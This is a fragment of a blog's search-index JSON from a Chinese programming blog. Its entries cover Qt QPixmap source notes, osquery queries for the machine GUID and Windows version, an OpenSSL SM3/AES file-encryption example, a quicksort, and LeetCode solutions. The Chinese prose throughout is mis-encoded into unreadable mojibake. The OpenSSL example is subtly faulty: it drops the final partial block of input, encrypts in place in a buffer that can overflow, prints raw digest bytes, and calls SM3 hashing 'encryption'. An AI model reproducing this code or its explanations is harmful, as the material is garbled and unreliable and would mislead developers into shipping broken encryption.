è¿”å›æ–‡ä»¶æœ€åä¸€æ¬¡ä¿®æ”¹çš„æ—¥æœŸå’Œæ—¶é—´ % HexString&lt;quint64&gt;(info.size()) // è¿”å›æ–‡ä»¶çš„å¤§å° % HexString&lt;uint&gt;(data ? data-&gt;pixelType() : QPlatformPixmap::PixmapType); // è¿™é‡Œçš„dataæ˜¯æˆå‘˜å˜é‡ï¼Œå°±æ˜¯è¯´å¦‚æœè®¾ç½®äº†dataçš„pixelTypeçš„å€¼å°±è¯»å–ï¼Œæ²¡è®¾ç½®çš„è¯å°±æ˜¯é»˜è®¤å€¼ QPlatformPixmap::PixmapType ä¸Šè¿°çš„ HexString&lt;type&gt;å°±æ˜¯ ASCII çš„æ•°ç»„å½¢å¼ï¼Œ16è¿›åˆ¶ çš„æ•°ç»„ã€‚ä¸Šè¿°ä»£ç ä¸­çš„ % æ“ä½œå¦‚æœä¸æ˜¯æ±‚ä½™çš„è¯ä¼šæ˜¯ä»€ä¹ˆå‘¢ã€‚å¦‚æœæ˜¯æ±‚ä½™ï¼ŒQString ä¼šæŠ¥é”™æ‰æ˜¯å‘€ï¼Ÿï¼Ÿï¼Ÿ è¿™é‡Œæœ€ç»ˆè¿˜æ˜¯é€šè¿‡è®¾ç½®å’ŒæŸ¥çœ‹ QPixmap çš„å†…ç½®å˜é‡ data ä¸­çš„æ ‡å¿—å»æŸ¥çœ‹å½“å‰æ–‡ä»¶æ˜¯ä¸æ˜¯å›¾ç‰‡ï¼Œå¦‚æœæ˜¯å›¾ç‰‡ï¼Œåˆ™ä¼šä¿®æ”¹å½“å‰çš„ QPixmap æŒ‡é’ˆï¼Œå¦‚æœä¸æ˜¯å°±ä¼šè¿”å› falseã€‚ 12if (QPixmapCache::find(key, this)) return true; è¿™é‡Œè¡¥å……ä¸€ä¸ªQPixmapCacheçš„demoï¼š 1234567/*åœ¨ç¼“å­˜ä¸­æŸ¥æ‰¾ä¸ç»™å®šé”®å…³è”çš„ç¼“å­˜pixmapã€‚å¦‚æœæ‰¾åˆ°äº†pixmapï¼Œå‡½æ•°å°†pixmapè®¾ç½®ä¸ºè¯¥pixmapå¹¶è¿”å›true;å¦åˆ™ï¼Œå®ƒå°†ä¿ç•™pixmapå¹¶è¿”å›falseã€‚*/QPixmap pm;if (!QPixmapCache::find(&quot;my_big_image&quot;, &amp;pm)) &#123; pm.load(&quot;bigimage.png&quot;); QPixmapCache::insert(&quot;my_big_image&quot;, pm);&#125;painter-&gt;drawPixmap(0, 0, pm); æœ€ç»ˆåˆ¤æ–­å½“å‰æ–‡ä»¶æ˜¯ä¸æ˜¯å›¾ç‰‡åº”è¯¥æ˜¯åœ¨ data-&gt;fromFile() ä¸­å®ç°çš„ã€‚ è¿™ä¸ªdataçš„å®šä¹‰ï¼š 1QExplicitlySharedDataPointer&lt;QPlatformPixmap&gt; data; æœªå®Œæˆè¿™ç¯‡æ–‡ç« è¿˜åœ¨ç¼–è¾‘ä¸­ è¡¥å…… è¡¥å……ä¸€ä¸‹ load()çš„å‡½æ•°æœ‰å¿…è¦è¯»ä¸€ä¸‹ã€‚ QPixmap::loadFromData() çš„æºç ã€‚ 12345678910111213141516171819202122232425262728293031323334/*! \\fn bool QPixmap::loadFromData(const uchar *data, uint len, const char *format, Qt::ImageConversionFlags flags) Loads a pixmap from the \\a len first bytes of the given binary \\a data. Returns \\c true if the pixmap was loaded successfully; otherwise invalidates the pixmap and returns \\c false. The loader attempts to read the pixmap using the specified \\a format. If the \\a format is not specified (which is the default), the loader probes the file for a header to guess the file format. If the data needs to be modified to fit in a lower-resolution result (e.g. converting from 32-bit to 8-bit), use the \\a flags to control the conversion. \\sa load(), &#123;QPixmap#Reading and Writing Image Files&#125;&#123;Reading and Writing Image Files&#125;*/bool QPixmap::loadFromData(const uchar *buf, uint len, const char *format, Qt::ImageConversionFlags flags)&#123; if (len == 0 || buf == 0) &#123; data.reset(); return false; &#125; data = QPlatformPixmap::create(0, 0, QPlatformPixmap::PixmapType); if (data-&gt;fromData(buf, len, format, flags)) return true; data.reset(); return false;&#125;","tags":[{"name":"å›¾ç‰‡","slug":"å›¾ç‰‡","permalink":"https://hodlyounger.github.io/tags/%E5%9B%BE%E7%89%87/"},{"name":"æ ¼å¼","slug":"æ ¼å¼","permalink":"https://hodlyounger.github.io/tags/%E6%A0%BC%E5%BC%8F/"},{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ä½¿ç”¨ osquery æŸ¥è¯¢ç³»ç»Ÿuuidå’Œç³»ç»Ÿä¿¡æ¯","date":"2023-10-27T01:24:02.555Z","path":"G_å·¥å…·/osquery/æŸ¥è¯¢uuidå’Œç³»ç»Ÿä¿¡æ¯/","text":"æŸ¥è¯¢uuid æ–¹æ³•ä¸€ è§æŸ¥è¯¢ä¿¡æ¯ æ–¹æ³•äºŒ é€šè¿‡æ³¨å†Œè¡¨ 12345SELECT data from registry where key =&#x27;HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Cryptography&#x27; AND name=&#x27;MachineGuid&#x27;;# æˆ–è€…SELECT data FROM registry WHERE path=&#x27;HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Cryptography\\\\MachineGuid&#x27; æŸ¥è¯¢ç³»ç»Ÿç‰ˆæœ¬å·å’Œwindowsç‰ˆæœ¬ æ–¹æ³•ä¸€ ç›´æ¥æŸ¥è¯¢ 1SELECT uuid, computer_name, hardware_model, hardware_serial FROM system_info; æ–¹æ³•äºŒ é€šè¿‡æ³¨å†Œè¡¨ 123456789101112SELECT data FROM registry WHERE key = &#x27;HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion&#x27; AND name IN(&#x27;CurrentMajorVersionNumber&#x27;,&#x27;CurrentMinorVersionNumber&#x27;, &#x27;CurrentBuildNumber&#x27;, &#x27;ProductName&#x27;)ORDER BY CASE name WHEN &#x27;ProductName&#x27; THEN 1 WHEN &#x27;CurrentMajorVersionNumber&#x27; THEN 2 WHEN &#x27;CurrentMinorVersionNumber&#x27; THEN 3 WHEN &#x27;CurrentBuildNumber&#x27; THEN 4 ELSE 3 END;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"osquery","slug":"osquery","permalink":"https://hodlyounger.github.io/tags/osquery/"}],"categories":[{"name":"G_å·¥å…·","slug":"G-å·¥å…·","permalink":"https://hodlyounger.github.io/categories/G-%E5%B7%A5%E5%85%B7/"},{"name":"osquery","slug":"G-å·¥å…·/osquery","permalink":"https://hodlyounger.github.io/categories/G-%E5%B7%A5%E5%85%B7/osquery/"}]},{"title":"è‡ªåŠ¨ç”Ÿæˆ readme æ–‡æ¡£","date":"2023-10-27T01:24:02.508Z","path":"G_å·¥å…·/ã€å·¥å…·ã€‘ReadneGenerator/","text":"æ¦‚è¿°ï¼šè‡ªåŠ¨ç”Ÿæˆ readme çš„å¼€æºå·¥å…· å¼€æºåœ°å€ï¼š https://github.com/kefranabg/readme-md-generator å®‰è£…æ–¹å¼ï¼šnpm i -g readme-md-generator npmç‰ˆæœ¬è¦å¤§äº8","tags":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"https://hodlyounger.github.io/tags/%E5%B7%A5%E5%85%B7/"},{"name":"readme","slug":"readme","permalink":"https://hodlyounger.github.io/tags/readme/"}],"categories":[{"name":"G_å·¥å…·","slug":"G-å·¥å…·","permalink":"https://hodlyounger.github.io/categories/G-%E5%B7%A5%E5%85%B7/"}]},{"title":"ã€OpenSSLã€‘ä½¿ç”¨SM3åŠ å¯†æ–‡ä»¶","date":"2023-10-27T01:24:02.507Z","path":"C_OpenSource/OpenSSL/ã€OpenSSLã€‘ä½¿ç”¨sm3åŠ å¯†æ–‡ä»¶/","text":"æ¦‚è¿°ï¼šä½¿ç”¨ OpensSSL è¿›è¡Œ SM3 åŠ å¯† ä»¥ä¸‹æ˜¯ä½¿ç”¨ OpenSSL åº“è¿›è¡Œ SM3 æ¶ˆæ¯æ‘˜è¦å’Œæ–‡ä»¶åŠ å¯†çš„ C++ ç¤ºä¾‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;#include &lt;openssl/evp.h&gt;#include &lt;openssl/sha.h&gt;#include &lt;openssl/sm3.h&gt;// è®¡ç®—å­—ç¬¦ä¸²çš„ SM3 æ‘˜è¦å€¼std::string sm3_hash_string(const std::string&amp; str) &#123; unsigned char md[SM3_DIGEST_LENGTH]; SM3(reinterpret_cast&lt;const unsigned char*&gt;(str.data()), str.size(), md); std::string hash_str(reinterpret_cast&lt;const char*&gt;(md), SM3_DIGEST_LENGTH); return hash_str;&#125;// è®¡ç®—æ–‡ä»¶çš„ SM3 æ‘˜è¦å€¼std::string sm3_hash_file(const std::string&amp; file_path) &#123; unsigned char md[SM3_DIGEST_LENGTH]; std::ifstream input(file_path, std::ios::binary); if (input) &#123; EVP_MD_CTX* mdctx = EVP_MD_CTX_new(); EVP_DigestInit_ex(mdctx, EVP_sm3(), nullptr); const size_t buf_size = 4096; char buf[buf_size]; while (input.read(buf, buf_size)) &#123; EVP_DigestUpdate(mdctx, buf, buf_size); &#125; size_t remain_size = input.gcount(); EVP_DigestUpdate(mdctx, buf, remain_size); EVP_DigestFinal_ex(mdctx, md, nullptr); EVP_MD_CTX_free(mdctx); input.close(); std::string hash_str(reinterpret_cast&lt;const char*&gt;(md), SM3_DIGEST_LENGTH); return hash_str; &#125; else &#123; throw std::runtime_error(&quot;fail to open file &quot; + file_path); &#125;&#125;// ä½¿ç”¨å¯†ç å¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†void encrypt_file(const std::string&amp; input_file_path, const std::string&amp; output_file_path, const std::string&amp; password) &#123; std::ifstream input(input_file_path, std::ios::binary); std::ofstream output(output_file_path, std::ios::binary); if (input &amp;&amp; output) &#123; const int key_len = EVP_MAX_KEY_LENGTH; const int iv_len = EVP_MAX_IV_LENGTH; unsigned char key[key_len]; unsigned char iv[iv_len]; EVP_BytesToKey(EVP_aes_256_cbc(), EVP_sm3(), nullptr, reinterpret_cast&lt;const unsigned char*&gt;(password.data()), password.size(), 1, key, iv); EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new(); EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv); const size_t buf_size = 4096; char buf[buf_size]; while (input.read(buf, buf_size)) &#123; int len = input.gcount(); int out_len = 0; EVP_EncryptUpdate(ctx, reinterpret_cast&lt;unsigned char*&gt;(buf), &amp;out_len, reinterpret_cast&lt;unsigned char*&gt;(buf), len); output.write(buf, out_len); &#125; int len = input.gcount(); int out_len = 0; EVP_EncryptFinal_ex(ctx, reinterpret_cast&lt;unsigned char*&gt;(buf), &amp;out_len); output.write(buf, out_len); EVP_CIPHER_CTX_free(ctx); input.close(); output.close(); &#125; else &#123; throw std::runtime_error(&quot;fail to open input/output file.&quot;); &#125;&#125;int main() &#123; std::string str = &quot;message to be hashed&quot;; std::cout &lt;&lt; &quot;SM3 hash of string \\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot;: &quot; &lt;&lt; sm3_hash_string(str) &lt;&lt; std::endl; std::string file_path = &quot;test.txt&quot;; std::cout &lt;&lt; &quot;SM3 hash of file \\&quot;&quot; &lt;&lt; file_path &lt;&lt; &quot;\\&quot;: &quot; &lt;&lt; sm3_hash_file(file_path) &lt;&lt; std::endl; std::string password = &quot;123456&quot;; try &#123; encrypt_file(file_path, &quot;test_encrypted.txt&quot;, password); &#125; catch (const std::exception&amp; e) &#123; std::cout &lt;&lt; &quot;Error: &quot; &lt;&lt; e.what() &lt;&lt; std::endl; &#125; return 0;&#125; ä¸Šè¿°ä»£ç ä¸­ï¼Œä½¿ç”¨ SM3 å‡½æ•°å¯¹å­—ç¬¦ä¸²æˆ–æ–‡ä»¶å†…å®¹è¿›è¡Œæ‘˜è¦ï¼›ä½¿ç”¨ EVP_BytesToKey å‡½æ•°ç”Ÿæˆå¯†ç åŠ å¯†å¯†é’¥å’Œåˆå§‹åŒ–å‘é‡ï¼Œå¹¶ä½¿ç”¨ EVP_EncryptInit_ex å‡½æ•°åˆå§‹åŒ–åŠ å¯†ä¸Šä¸‹æ–‡ï¼Œåœ¨å¾ªç¯ä¸­è°ƒç”¨ EVP_EncryptUpdate å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œé€å—åŠ å¯†ï¼Œæœ€åè°ƒç”¨ EVP_EncryptFinal_ex å‡½æ•°å®ŒæˆåŠ å¯†è¿‡ç¨‹ï¼Œå°†ç»“æœå†™å…¥æ–°çš„åŠ å¯†æ–‡ä»¶ä¸­ã€‚","tags":[{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://hodlyounger.github.io/tags/OpenSSL/"},{"name":"åŠ å¯†/SM3","slug":"åŠ å¯†-SM3","permalink":"https://hodlyounger.github.io/tags/%E5%8A%A0%E5%AF%86-SM3/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/"},{"name":"OpenSSL","slug":"C-OpenSource/OpenSSL","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/OpenSSL/"}]},{"title":"å¸¸è§æ’åºç®—æ³•æ•´ç†ï¼ˆC++)","date":"2023-10-27T01:24:02.504Z","path":"G_LeetCode/æ’åºç®—æ³•/","text":"å¿«é€Ÿæ’åº 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071/******************************************************************************Welcome to GDB Online.GDB online is an online compiler and debugger tool for C, C++, Python, Java, PHP, Ruby, Perl,C#, OCaml, VB, Swift, Pascal, Fortran, Haskell, Objective-C, Assembly, HTML, CSS, JS, SQLite, Prolog.Code, Compile, Run and Debug online from anywhere in world.*******************************************************************************/#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;// å·¦é—­å³é—­åŒºé—´int getRand(int min, int max) &#123; return ( rand() % (max - min + 1) ) + min ;&#125;void quickSort(vector&lt;int&gt;&amp; nums, int start, int end)&#123; if(start &gt; end) return; int i = start, j = end; int key = nums[start]; while(i &lt; j) &#123; while(i &lt; j &amp;&amp; nums[j] &lt; key) j--; while(i &lt; j &amp;&amp; nums[i] &gt;= key) i++; if(i&lt;j) &#123; swap(nums[i],nums[j]); &#125; &#125; swap(nums[i], nums[start]); quickSort(nums, start, i-1); quickSort(nums, i+1, end); &#125;void sort(vector&lt;int&gt; &amp; nums)&#123; if(nums.empty() || nums.size() &lt; 2) &#123; return; &#125; quickSort(nums, 0, nums.size() - 1);&#125;int main()&#123; vector&lt;int&gt; nums; for (int i = 0; i &lt; 20; i++) &#123; nums.push_back(std::move(getRand(0,100))); &#125; sort(nums); for (auto it : nums) cout &lt;&lt; it &lt;&lt; endl; return 0;&#125;","tags":[{"name":"LeetCode/æ’åº","slug":"LeetCode-æ’åº","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%8E%92%E5%BA%8F/"},{"name":"LeetCode/å¿«é€Ÿæ’åº","slug":"LeetCode-å¿«é€Ÿæ’åº","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"}],"categories":[{"name":"G_LeetCode","slug":"G-LeetCode","permalink":"https://hodlyounger.github.io/categories/G-LeetCode/"}]},{"title":"2611. è€é¼ å’Œå¥¶é…ª","date":"2023-10-27T01:24:02.503Z","path":"G_LeetCode/2611. è€é¼ å’Œå¥¶é…ª/","text":"2023å¹´6æœˆ7æ—¥23:18:51 [toc] 2611. è€é¼ å’Œå¥¶é…ª - åŠ›æ‰£ï¼ˆLeetCodeï¼‰ æœ‰ä¸¤åªè€é¼ å’Œ n å—ä¸åŒç±»å‹çš„å¥¶é…ªï¼Œæ¯å—å¥¶é…ªéƒ½åªèƒ½è¢«å…¶ä¸­ä¸€åªè€é¼ åƒæ‰ã€‚ ä¸‹æ ‡ä¸º i å¤„çš„å¥¶é…ªè¢«åƒæ‰çš„å¾—åˆ†ä¸ºï¼š å¦‚æœç¬¬ä¸€åªè€é¼ åƒæ‰ï¼Œåˆ™å¾—åˆ†ä¸º reward1[i] ã€‚ å¦‚æœç¬¬äºŒåªè€é¼ åƒæ‰ï¼Œåˆ™å¾—åˆ†ä¸º reward2[i] ã€‚ ç»™ä½ ä¸€ä¸ªæ­£æ•´æ•°æ•°ç»„ reward1 ï¼Œä¸€ä¸ªæ­£æ•´æ•°æ•°ç»„ reward2 ï¼Œå’Œä¸€ä¸ªéè´Ÿæ•´æ•° k ã€‚ è¯·ä½ è¿”å›ç¬¬ä¸€åªè€é¼ æ°å¥½åƒæ‰ k å—å¥¶é…ªçš„æƒ…å†µä¸‹ï¼Œæœ€å¤§ å¾—åˆ†ä¸ºå¤šå°‘ã€‚ ç¤ºä¾‹ 1ï¼š è¾“å…¥ï¼šreward1 = [1,1,3,4], reward2 = [4,4,1,1], k = 2 è¾“å‡ºï¼š15 è§£é‡Šï¼šè¿™ä¸ªä¾‹å­ä¸­ï¼Œç¬¬ä¸€åªè€é¼ åƒæ‰ç¬¬ 2 å’Œ 3 å—å¥¶é…ªï¼ˆä¸‹æ ‡ä» 0 å¼€å§‹ï¼‰ï¼Œç¬¬äºŒåªè€é¼ åƒæ‰ç¬¬ 0 å’Œ 1 å—å¥¶é…ªã€‚ æ€»å¾—åˆ†ä¸º 4 + 4 + 3 + 4 = 15 ã€‚ 15 æ˜¯æœ€é«˜å¾—åˆ†ã€‚ ç¤ºä¾‹ 2ï¼š è¾“å…¥ï¼šreward1 = [1,1], reward2 = [1,1], k = 2 è¾“å‡ºï¼š2 è§£é‡Šï¼šè¿™ä¸ªä¾‹å­ä¸­ï¼Œç¬¬ä¸€åªè€é¼ åƒæ‰ç¬¬ 0 å’Œ 1 å—å¥¶é…ªï¼ˆä¸‹æ ‡ä» 0 å¼€å§‹ï¼‰ï¼Œç¬¬äºŒåªè€é¼ ä¸åƒä»»ä½•å¥¶é…ªã€‚ æ€»å¾—åˆ†ä¸º 1 + 1 = 2 ã€‚ 2 æ˜¯æœ€é«˜å¾—åˆ†ã€‚ æç¤ºï¼š 1 &lt;= n == reward1.length == reward2.length &lt;= 105 1 &lt;= reward1[i], reward2[i] &lt;= 1000 0 &lt;= k &lt;= n æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode.cn/problems/mice-and-cheese è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ Solution æ€è·¯ è´ªå¿ƒ + æ’åº ç®—å‡ºå·®å€¼ï¼Œå–K ä¸ªæœ€å¤§å€¼å³å¯ ä»£ç  123456789101112131415161718192021class Solution &#123;public: int miceAndCheese(vector&lt;int&gt;&amp; reward1, vector&lt;int&gt;&amp; reward2, int k) &#123; int ans = 0; int n = reward1.size(); vector&lt;int&gt; diffs(n); for (int i = 0; i &lt; n; i++) &#123; ans += reward2[i]; diffs[i] = reward1[i] - reward2[i]; &#125; sort(diffs.begin(), diffs.end()); for (int i = 1; i &lt;=k; i++) &#123; ans += diffs[n-i]; &#125; return ans; &#125;&#125;; 123456789101112131415161718func miceAndCheese(reward1 []int, reward2 []int, k int) int &#123; ans := 0 n := len(reward1) diffs := make([]int, n) for i:=0; i&lt;n; i++ &#123; ans += reward2[i] diffs[i] = reward1[i] - reward2[i] &#125; sort.Ints(diffs) for i:=1; i&lt;=k; i++ &#123; ans += diffs[n-i] &#125; return ans&#125;","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://hodlyounger.github.io/tags/LeetCode/"},{"name":"LeetCode/è´ªå¿ƒ","slug":"LeetCode-è´ªå¿ƒ","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E8%B4%AA%E5%BF%83/"},{"name":"LeetCode/æ’åº","slug":"LeetCode-æ’åº","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%8E%92%E5%BA%8F/"}],"categories":[{"name":"G_LeetCode","slug":"G-LeetCode","permalink":"https://hodlyounger.github.io/categories/G-LeetCode/"}]},{"title":"2352. ç›¸ç­‰è¡Œåˆ—å¯¹ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰","date":"2023-10-27T01:24:02.501Z","path":"G_LeetCode/2352. ç›¸ç­‰è¡Œåˆ—å¯¹/","text":"2023_06_06 [toc] 2352. ç›¸ç­‰è¡Œåˆ—å¯¹ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰ ç»™ä½ ä¸€ä¸ªä¸‹æ ‡ä» 0 å¼€å§‹ã€å¤§å°ä¸º n x n çš„æ•´æ•°çŸ©é˜µ grid ï¼Œè¿”å›æ»¡è¶³ Ri è¡Œå’Œ Cj åˆ—ç›¸ç­‰çš„è¡Œåˆ—å¯¹ (Ri, Cj) çš„æ•°ç›®ã€‚ å¦‚æœè¡Œå’Œåˆ—ä»¥ç›¸åŒçš„é¡ºåºåŒ…å«ç›¸åŒçš„å…ƒç´ ï¼ˆå³ç›¸ç­‰çš„æ•°ç»„ï¼‰ï¼Œåˆ™è®¤ä¸ºäºŒè€…æ˜¯ç›¸ç­‰çš„ã€‚ ç¤ºä¾‹ 1ï¼š è¾“å…¥ï¼šgrid = [[3,2,1],[1,7,6],[2,7,7]] è¾“å‡ºï¼š1 è§£é‡Šï¼šå­˜åœ¨ä¸€å¯¹ç›¸ç­‰è¡Œåˆ—å¯¹ï¼š (ç¬¬ 2 è¡Œï¼Œç¬¬ 1 åˆ—)ï¼š[2,7,7] ç¤ºä¾‹ 2ï¼š è¾“å…¥ï¼šgrid = [[3,1,2,2],[1,4,4,5],[2,4,2,2],[2,4,2,2]] è¾“å‡ºï¼š3 è§£é‡Šï¼šå­˜åœ¨ä¸‰å¯¹ç›¸ç­‰è¡Œåˆ—å¯¹ï¼š (ç¬¬ 0 è¡Œï¼Œç¬¬ 0 åˆ—)ï¼š[3,1,2,2] (ç¬¬ 2 è¡Œ, ç¬¬ 2 åˆ—)ï¼š[2,4,2,2] (ç¬¬ 3 è¡Œ, ç¬¬ 2 åˆ—)ï¼š[2,4,2,2] æç¤ºï¼š n == grid.length == grid[i].length 1 &lt;= n &lt;= 200 1 &lt;= grid[i][j] &lt;= 105 æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode.cn/problems/equal-row-and-column-pairs è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ Solution cpp 123456789101112131415161718192021222324252627282930class Solution &#123;public: int equalPairs(vector&lt;vector&lt;int&gt;&gt;&amp; grid) &#123; int res = 0, n = grid.size(); for (int row = 0; row &lt; n; row++) &#123; for (int col = 0; col &lt; n; col++) &#123; if(equal(row, col, grid)) &#123; res++; &#125; &#125; &#125; return res; &#125; bool equal(int row, int col, vector&lt;vector&lt;int&gt;&gt; &amp;grid) &#123; int n = grid.size(); for (int i = 0; i &lt; n; i++) &#123; if(grid[row][i] != grid[i][col]) &#123; return false; &#125; &#125; return true; &#125;&#125;; Go 1234567891011121314151617181920212223func equalPairs(grid [][]int) int &#123; n := len(grid) cnt := make(map[string]int) for _,row := range grid &#123; cnt[fmt.Sprint(row)]++ &#125; res := 0 for j := 0; j &lt; n; j++ &#123; var arr[] int for i := 0; i &lt; n; i++ &#123; arr = append(arr, grid[i][j]) &#125; if val,ok := cnt[fmt.Sprint(arr)]; ok &#123; res += val &#125; &#125; return res&#125;","tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://hodlyounger.github.io/tags/LeetCode/"},{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Code/CPP","slug":"Code-CPP","permalink":"https://hodlyounger.github.io/tags/Code-CPP/"},{"name":"LeetCode/çŸ©é˜µ","slug":"LeetCode-çŸ©é˜µ","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E7%9F%A9%E9%98%B5/"},{"name":"LeetCode/æ¨¡æ‹Ÿ","slug":"LeetCode-æ¨¡æ‹Ÿ","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%A8%A1%E6%8B%9F/"},{"name":"LeetCode/æ•°æ®","slug":"LeetCode-æ•°æ®","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%95%B0%E6%8D%AE/"},{"name":"LeetCode/å“ˆå¸Œè¡¨","slug":"LeetCode-å“ˆå¸Œè¡¨","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E5%93%88%E5%B8%8C%E8%A1%A8/"},{"name":"Code/C","slug":"Code-C","permalink":"https://hodlyounger.github.io/tags/Code-C/"}],"categories":[{"name":"G_LeetCode","slug":"G-LeetCode","permalink":"https://hodlyounger.github.io/categories/G-LeetCode/"}]},{"title":"1706. çƒä¼šè½ä½•å¤„ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰","date":"2023-10-27T01:24:02.500Z","path":"G_LeetCode/1706. çƒä¼šè½ä½•å¤„/","text":"2022_02_24 [toc] 1706. çƒä¼šè½ä½•å¤„ ç”¨ä¸€ä¸ªå¤§å°ä¸º m x n çš„äºŒç»´ç½‘æ ¼ grid è¡¨ç¤ºä¸€ä¸ªç®±å­ã€‚ä½ æœ‰ n é¢—çƒã€‚ç®±å­çš„é¡¶éƒ¨å’Œåº•éƒ¨éƒ½æ˜¯å¼€ç€çš„ã€‚ ç®±å­ä¸­çš„æ¯ä¸ªå•å…ƒæ ¼éƒ½æœ‰ä¸€ä¸ªå¯¹è§’çº¿æŒ¡æ¿ï¼Œè·¨è¿‡å•å…ƒæ ¼çš„ä¸¤ä¸ªè§’ï¼Œå¯ä»¥å°†çƒå¯¼å‘å·¦ä¾§æˆ–è€…å³ä¾§ã€‚ å°†çƒå¯¼å‘å³ä¾§çš„æŒ¡æ¿è·¨è¿‡å·¦ä¸Šè§’å’Œå³ä¸‹è§’ï¼Œåœ¨ç½‘æ ¼ä¸­ç”¨ 1 è¡¨ç¤ºã€‚ å°†çƒå¯¼å‘å·¦ä¾§çš„æŒ¡æ¿è·¨è¿‡å³ä¸Šè§’å’Œå·¦ä¸‹è§’ï¼Œåœ¨ç½‘æ ¼ä¸­ç”¨ -1 è¡¨ç¤ºã€‚ åœ¨ç®±å­æ¯ä¸€åˆ—çš„é¡¶ç«¯å„æ”¾ä¸€é¢—çƒã€‚æ¯é¢—çƒéƒ½å¯èƒ½å¡åœ¨ç®±å­é‡Œæˆ–ä»åº•éƒ¨æ‰å‡ºæ¥ã€‚å¦‚æœçƒæ°å¥½å¡åœ¨ä¸¤å—æŒ¡æ¿ä¹‹é—´çš„ â€œVâ€ å½¢å›¾æ¡ˆï¼Œæˆ–è€…è¢«ä¸€å—æŒ¡å¯¼å‘åˆ°ç®±å­çš„ä»»æ„ä¸€ä¾§è¾¹ä¸Šï¼Œå°±ä¼šå¡ä½ã€‚ è¿”å›ä¸€ä¸ªå¤§å°ä¸º n çš„æ•°ç»„ answer ï¼Œå…¶ä¸­ answer[i] æ˜¯çƒæ”¾åœ¨é¡¶éƒ¨çš„ç¬¬ i åˆ—åä»åº•éƒ¨æ‰å‡ºæ¥çš„é‚£ä¸€åˆ—å¯¹åº”çš„ä¸‹æ ‡ï¼Œå¦‚æœçƒå¡åœ¨ç›’å­é‡Œï¼Œåˆ™è¿”å› -1 ã€‚ ç¤ºä¾‹ 1ï¼š 12345678è¾“å…¥ï¼šgrid = [[1,1,1,-1,-1],[1,1,1,-1,-1],[-1,-1,-1,1,1],[1,1,1,1,-1],[-1,-1,-1,-1,-1]]è¾“å‡ºï¼š[1,-1,-1,-1,-1]è§£é‡Šï¼šç¤ºä¾‹å¦‚å›¾ï¼šb0 çƒå¼€å§‹æ”¾åœ¨ç¬¬ 0 åˆ—ä¸Šï¼Œæœ€ç»ˆä»ç®±å­åº•éƒ¨ç¬¬ 1 åˆ—æ‰å‡ºã€‚b1 çƒå¼€å§‹æ”¾åœ¨ç¬¬ 1 åˆ—ä¸Šï¼Œä¼šå¡åœ¨ç¬¬ 2ã€3 åˆ—å’Œç¬¬ 1 è¡Œä¹‹é—´çš„ &quot;V&quot; å½¢é‡Œã€‚b2 çƒå¼€å§‹æ”¾åœ¨ç¬¬ 2 åˆ—ä¸Šï¼Œä¼šå¡åœ¨ç¬¬ 2ã€3 åˆ—å’Œç¬¬ 0 è¡Œä¹‹é—´çš„ &quot;V&quot; å½¢é‡Œã€‚b3 çƒå¼€å§‹æ”¾åœ¨ç¬¬ 3 åˆ—ä¸Šï¼Œä¼šå¡åœ¨ç¬¬ 2ã€3 åˆ—å’Œç¬¬ 0 è¡Œä¹‹é—´çš„ &quot;V&quot; å½¢é‡Œã€‚b4 çƒå¼€å§‹æ”¾åœ¨ç¬¬ 4 åˆ—ä¸Šï¼Œä¼šå¡åœ¨ç¬¬ 2ã€3 åˆ—å’Œç¬¬ 1 è¡Œä¹‹é—´çš„ &quot;V&quot; å½¢é‡Œã€‚ ç¤ºä¾‹ 